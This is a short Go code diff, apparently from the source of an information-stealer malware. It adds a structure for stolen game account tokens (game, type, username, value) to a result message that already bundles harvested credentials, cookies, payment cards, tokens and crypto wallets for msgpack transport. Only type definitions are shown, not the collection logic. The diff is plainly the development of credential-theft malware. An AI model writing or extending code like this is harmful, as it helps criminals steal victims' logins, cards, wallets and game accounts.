@@ -287,13 +287,21 @@ type StealWallet struct {
 	DataB64  string `msgpack:"dataB64"`
 }
 
+type StealGameToken struct {
+	Game     string `msgpack:"game"`
+	Type     string `msgpack:"type"`
+	Username string `msgpack:"username"`
+	Value    string `msgpack:"value"`
+}
+
 type StealResult struct {
-	Type        string            `msgpack:"type"`
-	CommandID   string            `msgpack:"commandId"`
+	Type        string           `msgpack:"type"`
+	CommandID   string           `msgpack:"commandId"`
 	Credentials []StealCredential `msgpack:"credentials"`
 	Cookies     []StealCookie     `msgpack:"cookies"`
 	Cards       []StealCard       `msgpack:"cards"`
 	Tokens      []string          `msgpack:"tokens"`
 	Wallets     []StealWallet     `msgpack:"wallets"`
+	GameTokens  []StealGameToken  `msgpack:"gameTokens"`
 	Errors      []string          `msgpack:"errors"`
 }
